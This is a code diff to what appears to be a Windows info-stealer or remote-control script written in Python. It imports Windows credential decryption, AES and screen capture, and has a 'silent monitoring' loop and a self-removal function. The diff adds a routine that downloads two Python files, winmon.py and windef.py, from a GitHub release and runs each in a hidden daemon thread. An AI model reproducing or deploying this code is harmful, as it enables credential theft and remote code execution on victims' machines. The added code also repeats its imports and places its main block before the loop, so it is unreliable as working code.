@@ -1,7 +1,10 @@
 import os, time, shutil, sqlite3, json, base64, subprocess, win32crypt
 from Crypto.Cipher import AES
 from PIL import ImageGrab
-
+import requests
+import runpy
+import threading
+from pathlib import Path
 CREATE_NO_WINDOW = 0x08000000
 
 # إعدادات القناة الثابتة
@@ -186,6 +189,57 @@ def remove_script():
     except Exception as e:
         return f"ERROR_DURING_REMOVE: {str(e)}"
 
+import requests
+import runpy
+import threading
+from pathlib import Path
+
+FILES = {
+    "winmon.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/winmon.py",
+    "windef.py": "https://github.com/anaslabrini/crossmos/releases/download/v1.0/windef.py"
+}
+
+BASE_DIR = Path(__file__).parent.resolve()
+
+
+def ensure_file(filename, url):
+    file_path = BASE_DIR / filename
+
+    if not file_path.exists():
+        print(f"[+] Downloading {filename} ...")
+        r = requests.get(url, timeout=15)
+        r.raise_for_status()
+        file_path.write_bytes(r.content)
+        print(f"[+] {filename} downloaded successfully.")
+    else:
+        print(f"[i] {filename} already exists.")
+
+    return file_path
+
+
+def run_script(path):
+    print(f"[>] Starting {path.name}")
+    runpy.run_path(str(path), run_name="__main__")
+
+
+def startup():
+    threads = []
+
+    for filename, url in FILES.items():
+        path = ensure_file(filename, url)
+
+        t = threading.Thread(target=run_script, args=(path,), daemon=True)
+        t.start()
+        threads.append(t)
+
+    # إبقاء البرنامج الرئيسي حيًا إذا كانت الملفات تحتوي على loops
+    for t in threads:
+        t.join()
+
+
+if __name__ == "__main__":
+    startup()
+
 
 
 # حلقة المراقبة الصامتة
@@ -248,4 +302,8 @@ while True:
             pass
 
     time.sleep(1)
+
+
+
+
 
